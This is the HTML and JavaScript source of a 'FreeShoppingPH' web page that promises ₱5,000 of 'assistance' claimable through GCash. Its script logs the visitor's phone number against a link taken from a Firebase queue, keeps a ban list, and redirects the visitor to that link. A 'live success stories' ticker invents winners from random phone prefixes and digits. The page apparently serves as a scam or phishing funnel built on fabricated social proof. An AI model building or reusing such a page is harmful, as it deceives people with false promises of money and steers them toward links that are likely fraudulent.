<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Official Assistance</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --nature-green: #2d6a4f; --emerald: #40916c; --white-glass: rgba(255, 255, 255, 0.95); }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Public Sans', sans-serif; background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: var(--white-glass); width: 100%; max-width: 400px; padding: 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
        .logo-img { width: 100%; border-radius: 15px; margin-bottom: 15px; }
        .amount { font-family: 'Quicksand', sans-serif; font-size: 42px; font-weight: 700; color: var(--nature-green); margin-bottom: 20px; }
        .pay-button { background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); color: white; width: 100%; padding: 18px; border: none; border-radius: 15px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .pay-button:disabled { background: #94a3b8; cursor: not-allowed; }
        .promo-photo { width: 100%; border-radius: 15px; margin-top: 15px; }
        /* Winners Ticker */
        .winners-container { margin-top: 20px; background: #f8fdfb; padding: 15px; border-radius: 20px; border: 1px solid #e0f2ea; text-align: left; }
        .winner-item { background: white; padding: 8px 12px; border-radius: 10px; display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 13px; border: 1px solid #eee; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
    <h1>Available Assistance</h1>
    <div class="amount">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="processClaim()">CLAIM THRU GCASH</button>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">

    <div class="winners-container">
        <h3 style="font-size:12px; text-align:center; color:var(--emerald); margin-bottom:10px;">🔴 LIVE SUCCESS STORIES</h3>
        <div id="winners-list"></div>
    </div>
</div>

<script>
    // FIREBASE CONFIG
    const firebaseConfig = {
        apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
        authDomain: "freeshoppingph-3bade.firebaseapp.com",
        databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
        projectId: "freeshoppingph-3bade",
        storageBucket: "freeshoppingph-3bade.firebasestorage.app",
        messagingSenderId: "858532604838",
        appId: "1:858532604838:web:59a6a0f31d63c2cdda7d67"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    async function processClaim() {
        const btn = document.getElementById('claimBtn');
        const userPhone = sessionStorage.getItem('user_phone') || "Unknown_User";

        btn.disabled = true;
        btn.innerText = "VERIFYING SLOT...";

        // 1. Check if Banned
        const banSnap = await db.ref('banned_ghosts/' + userPhone).once('value');
        if (banSnap.exists()) {
            alert("Account restricted.");
            btn.innerText = "BANNED";
            return;
        }

        // 2. Find Available Link (Queue System)
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value')
        .then((snapshot) => {
            if (snapshot.exists()) {
                let linkId, linkData;
                snapshot.forEach(c => { linkId = c.key; linkData = c.val(); });

                // 3. Lock the Link
                db.ref('links/' + linkId).update({
                    status: 'in-use',
                    claimedBy: userPhone,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                }).then(() => {
                    btn.innerText = "REDIRECTING...";
                    setTimeout(() => { window.location.href = linkData.url; }, 1000);
                });
            } else {
                alert("No slots available. Please try again later.");
                btn.disabled = false;
                btn.innerText = "CLAIM THRU GCASH";
            }
        });
    }

    // Winners Ticker Logic
    const prefixes = ['0917', '0915', '0927', '0935', '0945', '0995'];
    function addWinner() {
        const list = document.getElementById('winners-list');
        const item = document.createElement('div');
        item.className = 'winner-item';
        item.innerHTML = `<span>${prefixes[Math.floor(Math.random()*6)]}***${Math.floor(1000+Math.random()*9000)}</span><span style="color:green; font-weight:bold;">+₱5,000</span>`;
        list.prepend(item);
        if (list.children.length > 4) list.removeChild(list.lastChild);
    }
    setInterval(addWinner, 4000);
    addWinner();
</script>
</body>
</html>
